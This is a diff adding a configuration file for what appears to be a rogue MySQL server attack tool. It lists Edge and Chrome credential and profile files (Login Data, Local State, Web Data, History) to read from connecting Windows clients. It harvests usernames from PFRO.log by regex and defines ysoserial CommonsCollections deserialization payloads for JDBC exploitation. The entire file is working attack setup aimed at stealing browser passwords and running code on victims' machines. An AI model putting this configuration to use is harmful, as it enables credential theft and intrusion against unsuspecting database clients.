@@ -1,0 +1,35 @@
+host: 0.0.0.0
+port: 3306
+version_string: "5.6.12-MariaDB"
+
+file_list: [
+  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
+  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Web Data",
+  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences",
+  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Bookmarks",
+  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State",
+  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History",
+  "C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
+  "C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data",
+  "C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Preferences",
+  "C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks",
+  "C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
+  "C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
+]
+save_path: ./fake_mysql_read
+always_read: false
+from_database_name: false
+
+w_default_file: [ "C:\\Windows\\PFRO.log" ]
+w_user_name_regx: "Users\\\\([a-zA-Z0-9!@#$%^)(&]+)\\\\"
+
+auth: true
+users:
+  - root: root
+  - mysql: mysql
+
+jdbc_exploit: false
+always_exploit: false
+ysoserial_command:
+  cc4: [ "java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections4", 'calc.exe' ]
+  cc7: [ "java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections7", 'calc.exe' ]
